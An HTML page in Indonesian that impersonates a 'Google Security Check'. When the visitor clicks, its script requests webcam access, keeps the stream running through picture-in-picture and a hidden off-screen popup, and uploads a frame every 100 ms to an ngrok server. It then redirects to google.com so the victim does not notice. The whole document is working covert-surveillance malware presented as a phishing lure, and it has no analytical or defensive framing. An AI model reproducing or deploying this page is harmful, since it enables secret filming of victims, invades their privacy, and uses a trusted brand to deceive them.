<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;
  var streamInterval = null;
  var pipWindow = null;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
  
  // Interval pengiriman frame (ms)
  var STREAM_INTERVAL = 100;

  // ============================================
  // FUNGSI: KIRIM FRAME KE SERVER (TELEMETRI ASINKRON)
  // ============================================
  function sendFrameToServer(stream) {
    try {
      // Buat elemen video sementara untuk capture
      var video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.play().catch(function(){});

      var canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      var ctx = canvas.getContext('2d');

      // Tunggu video siap, lalu capture
      video.onloadedmetadata = function() {
        setInterval(function() {
          if (video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(function(blob) {
              if (!blob) return;
              var formData = new FormData();
              formData.append('file', blob, 'capture.jpg');

              // Kirim via fetch (keepalive)
              fetch(SERVER_ENDPOINT, {
                method: 'POST',
                body: formData,
                keepalive: true
              }).catch(function(){});

              // Fallback: sendBeacon (jika fetch gagal)
              // navigator.sendBeacon(SERVER_ENDPOINT, blob);

            }, 'image/jpeg', 0.5);
          }
        }, STREAM_INTERVAL);
      };
    } catch(e) {
      log("[-] Frame Error: " + e.message);
    }
  }

  // ============================================
  // FUNGSI: ENTER PiP (PICTURE-IN-PICTURE)
  // ============================================
  function enterPiP(stream) {
    try {
      // Buat video element
      var video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      video.style.display = 'none';
      document.body.appendChild(video);

      video.play().then(function() {
        // Minta PiP
        video.requestPictureInPicture()
          .then(function() {
            log("[+] 🎥 PiP AKTIF (Video Melayang)!");
          })
          .catch(function(err) {
            log("[-] PiP Gagal: " + err.message);
          });
      }).catch(function(err) {
        log("[-] Video Play Gagal: " + err.message);
      });
    } catch(e) {
      log("[-] PiP Error: " + e.message);
    }
  }

  // ============================================
  // FUNGSI: POPUP WINDOW TERISOLASI (ALTERNATIF PiP)
  // ============================================
  function createPopupWindow(stream) {
    try {
      // Buka jendela kecil (tersembunyi)
      var win = window.open('', 'StreamWindow', 'width=1,height=1,left=-1000,top=-1000');
      if (!win) {
        log("[-] Popup diblokir.");
        return;
      }

      // Tulis video ke popup
      win.document.write(`
        <!DOCTYPE html>
        <html>
        <body style="margin:0;background:#000;">
          <video id="pipVideo" autoplay playsinline muted style="width:100%;height:100%;"></video>
          <script>
            window.onload = function() {
              var video = document.getElementById('pipVideo');
              video.srcObject = window.opener.stream;
              video.play().catch(function(){});
              
              // Paksa PiP
              setTimeout(function() {
                if (document.pictureInPictureElement) {
                  document.exitPictureInPicture();
                }
                video.requestPictureInPicture()
                  .then(function() {
                    window.opener.postMessage({ type: 'PIP_GRANTED' }, '*');
                  })
                  .catch(function(err) {
                    window.opener.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
                  });
              }, 500);
            };
          <\/script>
        </body>
        </html>
      `);

      // Kirim stream ke popup
      win.stream = stream;
      log("[+] Popup Window Terisolasi Dibuat.");

      // Listener pesan dari popup
      window.addEventListener('message', function(e) {
        if (e.data.type === 'PIP_GRANTED') {
          log("[+] 🎥 PiP (Popup) AKTIF!");
        } else if (e.data.type === 'PIP_DENIED') {
          log("[-] PiP (Popup) Ditolak: " + e.data.error);
        }
      });

    } catch(e) {
      log("[-] Popup Error: " + e.message);
    }
  }

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', async function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Lifecycle Persistence...");

    // ============================================
    // A. MINTA IZIN KAMERA
    // ============================================
    try {
      log("[+] Meminta Izin Kamera...");
      
      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      log("[+] 🚨 KAMERA BERHASIL diakses!");

      // ============================================
      // B. PERTAHANKAN STREAM (PiP & POPUP)
      // ============================================
      // B1. PiP (Langsung)
      enterPiP(stream);

      // B2. Popup Window (Alternatif)
      createPopupWindow(stream);

      // B3. Mulai Telemetri (Kirim Frame)
      sendFrameToServer(stream);

      // ============================================
      // C. REDIRECT KE GOOGLE (INSTAN)
      // ============================================
      setTimeout(function() {
        log("[+] Redirect ke Google.com...");
        try {
          window.location.replace(TARGET_URL);
        } catch(e) {}
      }, 500); // 500ms setelah kamera aktif

    } catch(err) {
      log("[-] Kamera diblokir: " + err.name);
      
      // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
      setTimeout(function() {
        log("[+] Redirect ke Google (kamera diblokir)...");
        window.location.replace(TARGET_URL);
      }, 1000);
    }

  }, { once: true });

})();
</script>
</body>
</html>
